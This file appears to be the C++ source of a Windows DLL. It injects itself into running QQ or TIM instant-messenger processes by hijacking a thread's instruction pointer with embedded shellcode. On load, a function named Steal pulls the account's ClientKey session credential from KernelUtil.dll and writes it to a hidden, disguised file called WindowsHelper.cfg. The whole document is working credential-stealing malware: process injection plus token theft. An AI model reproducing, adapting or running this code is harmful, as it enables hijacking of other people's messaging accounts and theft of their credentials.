// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

typedef BSTR CTXStringW;
typedef PVOID(*Get)(PVOID ,const char*);
HMODULE SelfHandle;
DWORD buffersize = 4096;
HANDLE hProcess;
PBYTE pBuffer;
char dllPath[MAX_PATH];

unsigned char shellcode[] = {
	0x60, 0x68, 0x11, 0x11, 0x11, 0x11, 0xB8, 0x22, 0x22, 0x22, 0x22, 0xFF, 0xD0, 0x33, 0xDB, 0xBB,
	0x33, 0x33, 0x33, 0x33, 0x50, 0xFF, 0xD3, 0x61, 0x68, 0x44, 0x44, 0x44, 0x44, 0xC3
};

int injectThread(DWORD pid, DWORD tid)
{
	HANDLE hEvent = CreateEventA(NULL,false,false,"ILoveNachoneko");
	CONTEXT con = { 0 };
	DWORD eip;
	con.ContextFlags = CONTEXT_ALL;
	BYTE* Loadaddress = (BYTE*)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	BYTE* Freeaddress = (BYTE*)GetProcAddress(LoadLibraryA("kernel32.dll"), "FreeLibrary");
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	}
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, tid);
	if (pBuffer == NULL) {
		pBuffer = (PBYTE)VirtualAllocEx(hProcess, NULL, buffersize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}
	SuspendThread(hThread);
	GetThreadContext(hThread, &con);

	eip = con.Eip;
	BYTE* p = pBuffer + buffersize / 2;
	memcpy(&shellcode[0x02], &p, 4);
	memcpy(&shellcode[0x07], &Loadaddress, 4);
	memcpy(&shellcode[0x10], &Freeaddress, 4);
	memcpy(&shellcode[0x19], &eip, 4);
	WriteProcessMemory(hProcess, pBuffer, shellcode, sizeof(shellcode), NULL);
	WriteProcessMemory(hProcess, pBuffer + buffersize / 2, dllPath,(strlen(dllPath) + 1) * sizeof(char), NULL);
	con.Eip = (ULONG)pBuffer;
	SetThreadContext(hThread, &con);
	ResumeThread(hThread);

	WaitForSingleObject(hEvent,INFINITE);//等待dll代码执行完毕 回收分配的内存
	VirtualFreeEx(hProcess,pBuffer,0,MEM_RELEASE);
	CloseHandle(hEvent);
	return 0;
}

DWORD enumProcess() {
	TCHAR processName[] = L"QQ.exe";
	TCHAR processName1[] = L"TIM.exe";
	DWORD pid = 0;
	PROCESSENTRY32 pn32 = { 0 };
	pn32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!Process32First(h, &pn32)) {
		CloseHandle(h);
		return 0;
	}
	do {
		if (wcscmp(processName, pn32.szExeFile) == 0 || wcscmp(processName1, pn32.szExeFile) == 0) {
			pid = pn32.th32ProcessID;
			break;
		}
	} while (Process32Next(h, &pn32));
	CloseHandle(h);
	return pid;
}

CTXStringW AllocTXString(const wchar_t* lpSrc)
{
    if (lpSrc == NULL) return NULL;
    BYTE* bBuffer = new BYTE[16 + (wcslen(lpSrc) + 1) * 2];
    if (bBuffer == NULL) return NULL;
    DWORD dwZero = 0;
    DWORD dwCount = 3;
    DWORD dwLenth = wcslen(lpSrc) + 1;
    memmove(bBuffer + 0 * 4, &dwZero, 4);
    memmove(bBuffer + 1 * 4, &dwCount, 4);
    memmove(bBuffer + 2 * 4, &dwLenth, 4);
    memmove(bBuffer + 3 * 4, &dwLenth, 4);
    wcscpy((wchar_t*)(bBuffer + 4 * 4), lpSrc);
    return CTXStringW(bBuffer + 16);
}

DWORD enumThread(DWORD pid) {
	DWORD tid = 0;
	THREADENTRY32 tn32 = {0};
	tn32.dwSize = sizeof(THREADENTRY32);
	HANDLE hToolHelp = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	if (!Thread32First(hToolHelp,&tn32)) {
		CloseHandle(hToolHelp);
		return 0;
	}
	do {
		if (tn32.th32OwnerProcessID == pid) {
			tid = tn32.th32ThreadID;
			break;
		}
	} while (Thread32Next(hToolHelp,&tn32));

	CloseHandle(hToolHelp);
	return tid;
}

char* LoveNachoneko() {
	char* dumpPath;
	dumpPath = (char*)LocalAlloc(LPTR,MAX_PATH);
	SHGetSpecialFolderPathA(NULL, dumpPath, CSIDL_LOCAL_APPDATA, false);
	strcat(dumpPath, "\\WindowsHelper.cfg");
	GetModuleFileNameA(SelfHandle,dllPath,MAX_PATH);
	DWORD pid = enumProcess();
	DWORD tid = enumThread(pid);
	injectThread(pid,tid);
	return dumpPath;
}

void Steal()
{
		HMODULE hKernelUtil = GetModuleHandle(L"KernelUtil.dll");
		if (hKernelUtil == NULL) {
			return;
		}
		char dumpPath[MAX_PATH];
		SHGetSpecialFolderPathA(NULL,dumpPath,CSIDL_LOCAL_APPDATA,false);
		strcat(dumpPath,"\\WindowsHelper.cfg");
		HANDLE hFile = CreateFileA(dumpPath,GENERIC_ALL,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
		HANDLE h = OpenEventA(EVENT_ALL_ACCESS,false,"ILoveNachoneko");
		Get GetSignature = (Get)GetProcAddress(hKernelUtil, "?GetSignature@Misc@Util@@YA?AVCTXStringW@@PBD@Z");
		WCHAR wsBuffer[MAX_PATH] = { 0 };
		CTXStringW ClientKey = AllocTXString(wsBuffer);
		PVOID res = GetSignature(&ClientKey, "buf32ByteValueAddedSignature");
		char* c = _com_util::ConvertBSTRToString(ClientKey);
		WriteFile(hFile,c,strlen(c),NULL,NULL);
		SetEvent(h);
		CloseHandle(h);
		CloseHandle(hFile);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		SelfHandle = hModule;
        Steal();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

